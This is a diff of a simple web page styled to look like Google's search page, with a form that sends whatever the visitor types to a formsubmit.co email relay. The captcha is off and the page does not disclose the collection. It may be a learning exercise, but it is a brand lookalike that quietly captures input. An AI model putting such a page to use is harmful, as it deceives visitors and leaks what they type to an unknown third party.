@@ -6,18 +6,13 @@
 <title>Search Box</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial, sans-serif;
-}
-
 body{
+    margin:0;
     display:flex;
     justify-content:center;
     align-items:center;
     height:100vh;
+    font-family:Arial, sans-serif;
     background:#fff;
 }
 
@@ -26,18 +21,18 @@ body{
 }
 
 .logo{
-    font-size:60px;
-    font-weight:bold;
+    font-size:70px;
     color:#4285F4;
+    font-weight:bold;
     margin-bottom:30px;
 }
 
-.search{
+.search-box{
     width:500px;
     padding:15px;
-    font-size:18px;
     border:1px solid #ccc;
     border-radius:30px;
+    font-size:18px;
     outline:none;
 }
 
@@ -45,10 +40,10 @@ button{
     margin-top:20px;
     padding:12px 30px;
     border:none;
+    border-radius:30px;
     background:#4285F4;
     color:white;
     font-size:18px;
-    border-radius:30px;
     cursor:pointer;
 }
 
@@ -63,20 +58,17 @@ button:hover{
 
 <div class="container">
 
-<h1 class="logo">Google</h1>
+<div class="logo">Google</div>
 
-<form action="https://formsubmit.co/your-email@gmail.com" method="POST">
+<form action="https://formsubmit.co/el/wicoxa" method="POST">
 
 <input type="hidden" name="_captcha" value="false">
-
 <input type="hidden" name="_template" value="table">
-
-<input type="hidden" name="_next" value="https://yourusername.github.io/yourrepository/">
 
 <input
 type="text"
 name="Search_Text"
-class="search"
+class="search-box"
 placeholder="Search Google or type a URL"
 required>
 
